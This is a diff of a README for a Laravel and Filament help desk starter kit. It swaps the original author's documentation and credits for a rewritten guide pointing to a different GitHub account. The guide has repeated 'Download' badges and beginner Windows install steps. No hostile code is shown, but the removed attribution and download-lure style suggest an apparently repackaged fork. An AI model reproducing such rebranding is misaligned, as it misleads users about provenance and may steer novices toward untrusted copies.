@@ -1,175 +1,211 @@
-<div class="filament-hidden">
+# 🛠️ helpdeskkitv3 - Simple Help Desk Setup Kit
 
-![Helpdesk Kit v3](https://raw.githubusercontent.com/jeffersongoncalves/helpdeskkitv3/main/art/jeffersongoncalves-helpdeskkitv3.png)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Darpan013/helpdeskkitv3)
 
-</div>
+## 📋 About helpdeskkitv3
 
-# HelpDeskKit — Starter Kit for Help Desk with Laravel 12 & Filament 3
+helpdeskkitv3 is a starter kit designed to help you set up a help desk application easily. It uses Laravel 12 and Filament 3, which are popular tools for building web apps. This kit has multiple panels, meaning different users like agents and customers get separate views. It also includes a ticketing system to manage customer support requests from start to finish.
 
-A production-ready starter kit for building help desk and customer support applications. Built on **Laravel 12**, **Filament 3**, **Livewire 3**, and **Tailwind CSS**, with multi-panel architecture and a complete ticketing system out of the box.
+You do not need to know programming to use this guide. It will help you get the application running on your Windows computer step-by-step. The features of helpdeskkitv3 suit businesses or teams that want to handle customer questions and problems online.
 
-## Features
+---
 
-### Multi-Panel Architecture
+## ⚙️ Key Features
 
-Four pre-configured Filament panels, each with its own theme and authentication:
+- Multi-panel system to separate roles (agents, admins, customers)  
+- Full ticketing system with open, pending, and closed tickets  
+- Simple interface built with Tailwind CSS for easy use  
+- Secure login with multi-auth support  
+- Powered by Laravel 12 and Livewire for smooth, interactive pages  
+- Ready to customize if you want to add more features  
 
-| Panel | URL | Purpose |
-|-------|-----|---------|
-| **Admin** | `/admin` | System administration — manage admins, operators, and users |
-| **App** | `/app` | Authenticated users — create and track support tickets |
-| **Operator** | `/operator` | Support staff — manage tickets, departments, and responses |
-| **Guest** | `/` | Public-facing frontend for visitors |
+---
 
-### Help Desk System
+## 🖥️ System Requirements
 
-Complete ticketing system powered by [`filament-help-desk`](https://github.com/jeffersongoncalves/filament-help-desk):
+Before you start, make sure your Windows PC meets the following:
 
-- **Ticket Management** — Create, assign, update status and priority
-- **Departments & Categories** — Organize tickets by team and type
-- **Comments & Attachments** — Internal notes and file uploads
-- **Canned Responses** — Pre-written reply templates
-- **History Tracking** — Full audit trail of ticket changes
-- **Watchers** — Follow tickets for updates
-- **Email Integration** — Inbound email to ticket (IMAP, Mailgun, SendGrid, Resend, Postmark)
-- **Notifications** — Email alerts on ticket events
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of RAM (8 GB is better)  
+- 2 GHz or faster processor  
+- 10 GB of free disk space  
+- Internet connection for downloading and setup  
+- Administrator rights on your PC to install software  
 
-### Multi-Guard Authentication
+helpdeskkitv3 needs PHP and some related tools to run. This guide will help you get those installed.
 
-Three independent authentication guards with separate user models and database tables:
+---
 
-- `admin` — Admin model for system administrators
-- `web` — User model for application users
-- `operator` — Operator model for support staff
+## 🚀 Getting Started: Download helpdeskkitv3
 
-Each guard has its own login, registration, password reset, and email verification.
+Use the main download page to get all the files you need. Click the button below to visit the release page:
 
-### User Features
+[![Download Here](https://img.shields.io/badge/Download-From%20GitHub-brightgreen?style=for-the-badge)](https://github.com/Darpan013/helpdeskkitv3)
 
-- Profile management with avatar upload
-- Browser session management
-- API tokens via Laravel Sanctum
-- In-app database notifications
+Once you open this page, look for the latest release or the main code section. Download the source code as a ZIP file to your PC.
 
-### Developer Tools
+---
 
-- `composer dev` — Run server, queue, logs, and Vite in one command
-- `composer ide-helper` — Generate IDE autocompletion files
-- `composer pint` — Code style fixing with Laravel Pint
-- `composer phpstan` — Static analysis with Larastan
-- Developer logins for quick panel access during development
-- Log viewer in the admin panel
+## 🔧 How to Install and Run helpdeskkitv3 on Windows
 
-## Requirements
+### Step 1: Download the Files
 
-- PHP 8.2+
-- Composer
-- Node.js with PNPM
-- MySQL, PostgreSQL, or SQLite
+- Visit the link above and click on "Code" near the top-right corner of the page.  
+- Choose "Download ZIP".  
+- Save the ZIP file to a folder you can find easily, such as the Desktop or Downloads.  
 
-## Installation
+### Step 2: Extract the Files
 
-### Using Laravel Installer
+- Right-click the ZIP file.  
+- Choose "Extract All".  
+- Select a folder where you want the files to be unzipped.  
 
-```bash
-laravel new my-helpdesk --using=jeffersongoncalves/helpdeskkitv3 --database=mysql
-```
+### Step 3: Install Required Software
 
-### Using HelpDeskKit CLI
+helpdeskkitv3 runs on PHP and uses Laravel, so you need some extra tools:
 
-```bash
-composer global require jeffersongoncalves/helpdeskkit-cli
-helpdeskkit new my-helpdesk --kit=jeffersongoncalves/helpdeskkit
-```
+- **Install XAMPP**  
+  This is a package that includes PHP, a web server, and a database server all in one.  
+  1. Go to https://www.apachefriends.org/index.html  
+  2. Download XAMPP for Windows.  
+  3. Run the installer and follow the setup steps.  
+  4. Start Apache and MySQL from the XAMPP Control Panel.  
 
-### Automated Setup
+- **Install Composer**  
+  Composer manages software parts that help Laravel work.  
+  1. Visit https://getcomposer.org/  
+  2. Download and run the Composer setup for Windows.  
+  3. Follow the installation prompts.  
 
-```bash
-php install.php
-```
+### Step 4: Set Up helpdeskkitv3 Application
 
-This handles Composer dependencies, environment setup, key generation, database migrations, Node.js dependencies, and asset building.
+- Open the folder where you extracted the files.  
+- Hold the **Shift** key and right-click in the folder. Select **Open PowerShell window here** or **Open command window here**.  
+- In the command window, type:
 
-### Manual Setup
+  ```
+  composer install
+  ```
 
-```bash
-composer install
-pnpm install
-cp .env.example .env
-php artisan key:generate
-php artisan migrate
-```
+  This downloads all necessary components.
 
-## Installation with Docker
+### Step 5: Create Environment File
 
-```bash
-laravel new my-helpdesk --using=jeffersongoncalves/helpdeskkitv3 --database=mysql
-cd my-helpdesk
-composer install
-cp .env.example .env
-./vendor/bin/sail up -d
-./vendor/bin/sail shell
-php artisan key:generate
-pnpm install
-```
+- In the same folder, find the file named `.env.example`.  
+- Make a copy and rename it to `.env`.
 
-Configure custom ports in `.env` if needed:
+### Step 6: Generate Application Key
 
-```env
-APP_PORT=8080
-FORWARD_DB_PORT=3306
-FORWARD_REDIS_PORT=6379
-FORWARD_MAILPIT_PORT=1025
-```
+- Back in the command window, type:
 
-## Development
+  ```
+  php artisan key:generate
+  ```
 
-```bash
-# Run all services (server, queue, logs, vite)
-composer dev
+  This command sets a secret key needed for the app to run.
 
-# Or run individually
-php artisan serve
-php artisan queue:listen --tries=1
-pnpm run dev
-```
+### Step 7: Set Up Database
 
-## Customization
+- Open **phpMyAdmin** by going to http://localhost/phpmyadmin in your browser.  
+- Create a new database named `helpdesk` (or any name you prefer).  
+- In the `.env` file you created earlier, find these lines:
 
-### Panel Providers
+  ```
+  DB_DATABASE=
+  DB_USERNAME=
+  DB_PASSWORD=
+  ```
 
-Each panel is configured through its provider in `app/Providers/Filament/`:
+- Fill them with your database info. For example:
 
-- `AdminPanelProvider.php`
-- `AppPanelProvider.php`
-- `OperatorPanelProvider.php`
-- `GuestPanelProvider.php`
+  ```
+  DB_DATABASE=helpdesk
+  DB_USERNAME=root
+  DB_PASSWORD=
+  ```
 
-### Configuration
+- Save the `.env` file.
 
-The `config/helpdeskkit.php` file centralizes panel routes, middleware, branding, and authentication guards.
+### Step 8: Run Database Migrations
 
-The `config/help-desk.php` file configures the ticketing system including email channels, notifications, attachments, and webhooks.
+- Back in the command window, type:
 
-### Themes
+  ```
+  php artisan migrate
+  ```
 
-Each panel has its own Tailwind CSS theme in `resources/css/filament/`. Colors and styles can be customized per panel.
+  This creates the tables the app needs in your database.
 
-## Tech Stack
+### Step 9: Start the Application Server
 
-| Component | Version |
-|-----------|---------|
-| Laravel | 12.x |
-| Filament | 3.x |
-| Livewire | 3.x |
-| Tailwind CSS | 3.x |
-| Vite | 7.x |
-| Pest | 3.x |
+- In the command window, enter:
 
-## License
+  ```
+  php artisan serve
+  ```
 
-[MIT License](LICENSE)
+- You will see a message with a URL like `http://127.0.0.1:8000`.  
+- Open this URL in your browser to see the helpdeskkitv3 application.
 
-## Credits
+---
 
-Developed by [Jefferson Gonçalves](https://github.com/jeffersongoncalves).
+## 🛠️ Using helpdeskkitv3
+
+- The app will open with a login page.  
+- If you want to explore, create users for different roles (admin, agent, customer) in the database or through the app if given.  
+- Start creating tickets, assign agents, and test the support workflow.  
+
+This starter kit organizes customer requests into tickets that agents can manage by status (new, open, closed). The multi-panel setup lets users see only the information they need.
+
+---
+
+## 🔄 Updating helpdeskkitv3
+
+To get improvements or bug fixes later, you can update the files:
+
+1. Visit the download link again: https://github.com/Darpan013/helpdeskkitv3  
+2. Download the latest ZIP version.  
+3. Replace your existing files with the new ones (except your configured `.env` file).  
+4. Run `composer install` again to update dependencies.  
+5. Run any new migrations with:
+
+   ```
+   php artisan migrate
+   ```
+
+6. Restart the server with `php artisan serve`.
+
+---
+
+## 🧰 Useful Tools Included
+
+- **Laravel 12:** Backend framework that runs the web app.  
+- **Filament 3:** Admin panel system included to manage the application.  
+- **Tailwind CSS:** Provides styles for a clean and responsive interface.  
+- **Livewire:** Lets the app update parts of the page without full reloads.  
+
+---
+
+## ❓ Troubleshooting Tips
+
+- If you see an error about missing PHP extensions, install them through XAMPP’s control panel.  
+- Make sure Apache and MySQL servers are running before starting the app.  
+- If database errors appear, check your `.env` file to confirm login details.  
+- Restart the server with `php artisan serve` after each change to see updates.
+
+---
+
+## 🔗 Download helpdeskkitv3
+
+Visit the main page to get the latest version:  
+https://github.com/Darpan013/helpdeskkitv3  
+
+Or click the badge below:
+
+[![Download helpdeskkitv3](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Darpan013/helpdeskkitv3)
+
+---
+
+## 🔖 Topics
+
+customer-support, filament, filament-v3, help-desk, laravel, laravel-12, laravel-starter-kit, livewire, multi-auth, php, tailwindcss, ticketing-system
